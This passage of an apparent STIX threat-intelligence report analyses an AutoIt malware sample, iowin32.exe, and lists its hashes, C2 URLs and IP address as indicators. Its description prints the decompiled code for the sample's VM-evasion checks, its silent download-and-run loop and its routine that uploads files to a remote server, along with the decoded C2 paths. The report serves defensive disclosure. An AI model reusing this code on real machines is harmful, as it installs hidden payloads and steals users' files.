+00001582 $colitems = $objwmiservice.execquery("SELECT * FROM Win32_BIOS",
+"WQL", 16 + 32)
+00001583 If IsObj($colitems) Then
+00001584 For $objitem In $colitems
+00001585 Select
+00001586 Case StringInStr($objitem.biosversion(0), "Vbox")
+00001587 _bootyvm($vmhit_count, $vmhit_details, "BIOS", "Found
+Vbox BIOS version")
+00001588 Case StringInStr($objitem.smbiosbiosversion, "virt")
+00001589 _bootyvm($vmhit_count, $vmhit_details, "BIOS", "Found
+Vbox BIOS version")
+00001590 EndSelect
+00001591 Next
+00001592 EndIf
+00001593 $colitems = $objwmiservice.execquery("SELECT * FROM Win32_Baseboard",
+"WQL", 16 + 32)
+00001594 If IsObj($colitems) Then
+00001595 For $objitem In $colitems
+00001596 Select
+00001597 Case StringInStr($objitem.name, "Base Board") AND
+StringInStr($objitem.product, "440BX Desktop Reference Platform")
+00001598 _bootyvm($vmhit_count, $vmhit_details, "MOTHERBOARD",
+'Found VMware-style motherboard, "440BX Desktop Reference Platform" / Name="Base
+Board"')
+00001599 EndSelect
+00001600 Next
+00001601 EndIf
+00001602 If $vmhit_count &gt;= 2 Then
+00001603 Return $vmhit_details &amp; @CRLF &amp; @CRLF &amp; "Hits in " &amp; $vmhit_count
+&amp; " of 4 hardware categories - probably a virtual machine."
+00001604 Else
+00001605 Return ""
+00001606 EndIf
+00001607 EndFunc
+==========================================================
+
+The strings from the above function are used to determine if the script will continue to run or not. If no virtual machines are detected, then the script will move on to another operation. If virtual machines are detected, then the script will stop running.
+==========================================================
+00002525 $a = _build()
+00002526 If NOT $a = "" Then Exit
+==========================================================
+
+This is the main function of the script. It is an infinite loop designed to run the _goawaypath() and gethttpread() function which is explained below.
+==========================================================
+00002543 _gethttpread($getfees)
+00002544 While 1
+00002545 _goawaypath()
+00002546 Sleep(9000)
+00002547 _gethttpread($splfile)
+00002548 Sleep(59000)
+00002549 WEnd
+==========================================================
+
+The _gethttpread() function is designed to download files from the malicious website "http://alertmymail.com/speluck31/getall.php?sysname=[COMPUTER_NAME]"
+(line 00002543) and "http://alertmymail.com/speluck31/online.php?sysname=[COMPUTER_NAME]" (line
+00002545). 
+
+It will then look for the downloaded files in the location C:\Startup\ and run them silently.
+If the program does not exist, it will attempt to re-download the program again - this time from the same domain but different path "http://alertmymail.com/speluck31/plugins/[FILENAME]" and stages them to the path C:\Startup\ so it can be run in a silent fashion automatically.
+==========================================================
+00002551 Func _gethttpread($uarel)
+00002552 Local $urllist
+00002553 Local $sdata = InetRead($uarel, 1)
+00002554 If $sdata = "" Then Return
+00002555 $sdata = BinaryToString($sdata)
+00002556 $urllist = StringSplit($sdata, ";", 1)
+00002557 For $i = 1 To $urllist[0]
+00002558 $urllist[$i] = $vitamins &amp; $urllist[$i]
+00002559 If NOT FileExists($wrkdir &amp; path2file($urllist[$i])) Then
+InetGet($urllist[$i], $wrkdir &amp; path2file($urllist[$i]))
+00002560 If FileExists($wrkdir &amp; path2file($urllist[$i])) Then Run($wrkdir
+&amp; path2file($urllist[$i]), "", @SW_HIDE)
+00002561 $urllist[$i] = ""
+00002562 Next
+00002563 EndFunc
+==========================================================
+
+The _goawaypath() function establishes a connection to alertmymail.com on port 80. It then searches through all the files in the C:\Startup\input directory. Files in that directory are then uploaded to the malicious website "alertmymail.com/speluck31/getmax.php?sysname=[COMPUTER_NAME]". The files are then deleted when it successfully transfers.
+==========================================================
+00002571 Func _goawaypath()
+00002572 FileChangeDir($updmedia)
+00002573 $search = FileFindFirstFile("*.*")
+00002574 If $search = -1 Then
+00002575 Return
+00002576 EndIf
+00002577 While 1
+00002578 Sleep(9000)
+00002579 $file = FileFindNextFile($search)
+00002580 If @error Then ExitLoop
+00002581 $socket = _httpconnect($updsrv, $myway)
+00002582 $get = _httppost_file($updsrv, $uarel, $socket, $file, "filename")
+00002583 $recv = _httpread($socket, 0)
+00002584 If $recv = 1 Then FileDelete($file)
+00002585 WEnd
+00002586 FileClose($search)
+00002587 Return
+00002588 EndFunc
+==========================================================
+
+The following items are global variables used in the script. The values are Base64 encoded. These values have been decoded and placed next to the "#" character.
+==========================================================
+# Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20100101 Firefox/16.0
+00002527
+HttpSetUserAgent(_base64decode("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNS4xOyBydjoxNi4wKSBH
+ZWNrby8yMDEwMDEwMSBGaXJlZm94LzE2LjA="))
+# C:\Startup\input\
+00002528 Global $updmedia = _base64decode("QzpcU3RhcnR1cFxpbnB1dFw=")
+# C:\Startup\
+00002529 Global $wrkdir = _base64decode("QzpcU3RhcnR1cFw=")
+# alertmymail.com
+00002530 Global $updsrv = _base64decode("YWxlcnRteW1haWwuY29t")
+00002531 Global $myway = "80"
+# speluck31/getmax.php
+00002532 Global $mylink = _base64decode("c3BlbHVjazMxL2dldG1heC5waHA=")
+00002533 Global $myperu = @ComputerName
+# sysname=[@ComputerName]
+00002534 Global $vars = _base64decode("c3lzbmFtZT0=") &amp; $myperu
+# speluck31/getmax.php?sysname=[@ComputerName]
+00002535 Global $uarel = $mylink &amp; "?" &amp; _httpencodestring($vars)
+# http://alertmymail.com/speluck31/getall.php?sysname=[@ComputerName]
+00002536 Global $getfees =
+_base64decode("aHR0cDovL2FsZXJ0bXltYWlsLmNvbS9zcGVsdWNrMzEvZ2V0YWxsLnBocD9zeXNuYW1l
+PQ==") &amp; $myperu
+# http://alertmymail.com/speluck31/online.php?sysname=[@ComputerName]
+00002537 Global $splfile
+=
+_base64decode("aHR0cDovL2FsZXJ0bXltYWlsLmNvbS9zcGVsdWNrMzEvb25saW5lLnBocD9zeXNuYW1lP
+Q==") &amp; $myperu
+# HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+00002538 Global $keyed
+=
+_base64decode("SEtFWV9DVVJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVu
+dFZlcnNpb25cUnVu")
+# http://alertmymail.com/speluck31/plugins/
+00002539 Global $vitamins =
+_base64decode("aHR0cDovL2FsZXJ0bXltYWlsLmNvbS9zcGVsdWNrMzEvcGx1Z2lucy8=")
+==========================================================</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-c4dfa32f-3d8e-4116-96c2-621a92714040">
+        <cybox:Object id="CISCP:Object-f4b88ae3-5e44-4570-8724-f573058dfb49">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">iowin32.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">694099</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">c65d4b721c8f2a1432b43a7e503fcff8</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">242f14291dfbabe022952ed8fc599042e130ca7a</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12288:faWzgMg7v3qnCiMErQohh0F4CCJ8lnyC8rv6S+W22Zz:CaHMv6CorjqnyC8rvl+gZz</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-cd48850d-121e-4585-9486-5076a519a8a8" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The file "iowin32.exe" uploads files in the "C:\Startup\input" directory to this malicious URL.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a7717e83-82d6-4778-bb69-930b2024700d">
+        <cybox:Object id="CISCP:Object-c5a83e92-31fe-49b6-a9b6-eb6cf6a74781">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://alertmymail.com/speluck31/getmax.php</URIObj:Value>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-eab8024b-c1a1-4c65-a154-a3ee0ea3dda1">
+              <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+                <AddrObj:Address_Value condition="Equals">95.47.153.179</AddrObj:Address_Value>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Resolved_To</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-b92db720-e2b2-44bf-927a-219bbd1461b2" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The file "iowin32.exe" downloads files from this malicious URL.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-143d36c3-0e1f-4fc5-9f18-d8d6c3b171e0">
+        <cybox:Object id="CISCP:Object-25a3a003-b356-466b-8cf0-8067fd508c9b">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://alertmymail.com/speluck31/getall.php</URIObj:Value>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-a198f19b-762e-4cb0-a084-27616d80cce0">
+              <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+                <AddrObj:Address_Value condition="Equals">95.47.153.179</AddrObj:Address_Value>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Resolved_To</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-6bc3b172-5f92-4cdf-854e-9e459bc1fcc2" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The file "iowin32.exe" downloads files from this malicious URL.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-c03650ab-92f4-406c-bfc7-6e682acd9fd5">
+        <cybox:Object id="CISCP:Object-90556d91-b28d-4490-a9dc-5ac2e0c05240">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://alertmymail.com/speluck31/online.php</URIObj:Value>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-59c9b0a4-754a-4dd2-87ee-0b5f66c3417f">
+              <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+                <AddrObj:Address_Value condition="Equals">95.47.153.179</AddrObj:Address_Value>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Resolved_To</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-eeac268a-6b03-48a2-9867-0070a4c93091" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The file "iowin32.exe" downloads files from this malicious URL.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-20203953-3239-45f5-8777-0987f71630c8">
+        <cybox:Object id="CISCP:Object-d4eeb69b-c182-425c-b2f5-d7cc3e418494">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://alertmymail.com/speluck31/plugins/</URIObj:Value>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-901d552a-f653-4b3d-9265-13689b01713d">
+              <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+                <AddrObj:Address_Value condition="Equals">95.47.153.179</AddrObj:Address_Value>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Resolved_To</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
